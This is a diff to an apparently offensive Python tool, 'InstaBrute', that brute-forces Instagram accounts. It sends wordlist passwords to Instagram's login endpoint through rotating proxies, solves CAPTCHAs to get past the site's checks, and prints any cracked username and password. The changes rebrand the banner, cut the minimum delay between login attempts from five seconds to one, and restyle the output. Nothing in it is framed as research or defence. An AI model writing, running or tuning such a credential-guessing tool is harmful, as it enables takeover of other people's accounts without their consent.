@@ -8,7 +8,7 @@ console = Console()
 
 # === CONFIG ===
 INSTAGRAM_LOGIN_URL = "https://www.instagram.com/accounts/login/ajax/"
-DELAY_BETWEEN_TRIES = (5, 10)
+DELAY_BETWEEN_TRIES = (1, 10)
 API_KEY = "1abc234de56fab7c89012d34e56fa7b8"
 USE_CAPTCHA = True
 MACHINES = ["Desktop", "Laptop", "Mobile"]
@@ -35,10 +35,10 @@ def banner():
 ██████╔╝█████╗  ██║  ██║██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║
 ██╔══██╗██╔══╝  ██║  ██║██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║
 ██║  ██║███████╗██████╔╝██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║
-╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
+╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚804╝
 [/bold red]
 """)
-    console.print("[bold yellow]Kali GPT - InstaBrute Initialized[/bold yellow]")
+    console.print("[bold yellow]REDPYHTON804 ⇝ InstaBrute Installed...[/bold yellow]")
     console.print(f"[cyan]System:[/cyan] {os.name} | [cyan]Distro:[/cyan] {distro.name(pretty=True)}")
 
 def validate_user(username):
@@ -128,13 +128,13 @@ def attempt(username, password, proxy=None):
         r = session.post(INSTAGRAM_LOGIN_URL, data=data, proxies=cfg, timeout=15)
 
         if r.status_code == 200 and '"authenticated":true' in r.text:
-            console.print(f"[green]✅ FOUND: {password}[/green]")
+            console.print(f"[bold green]✅ FOUND ⇝ {password}[/bold green]")
             found_password = password
         elif 'captcha' in r.text.lower() and USE_CAPTCHA:
             token = solve_captcha("6Le...replace_with_sitekey...", "https://www.instagram.com/accounts/login/")
             console.print(f"[blue]CAPTCHA token: {token}[/blue]")
         else:
-            console.print(f"[white]❌ Failed: {password}[/white]")
+            console.print(f"[bold red]❌ Failed ⇝ {password}[/bold red]")
     except Exception as e:
         console.print(f"[red][!] Error: {type(e).__name__}[/red]")
 
@@ -158,9 +158,9 @@ def main():
         attempt(args.username, pwd, get_proxy())
 
     if found_password:
-        console.print(f"\n[green]🎯 Cracked: {args.username}:{found_password}[/green]")
+        console.print(f"\n[bold green]🎯 Cracked ⇝ {args.username}⟺{found_password}[/bold green]")
     else:
-        console.print("\n[red]❌ No match found.[/red]")
+        console.print("\n[bold red]❌ No match found in WORDLIST...[/bold red]")
 
 if __name__ == "__main__":
     try: main()
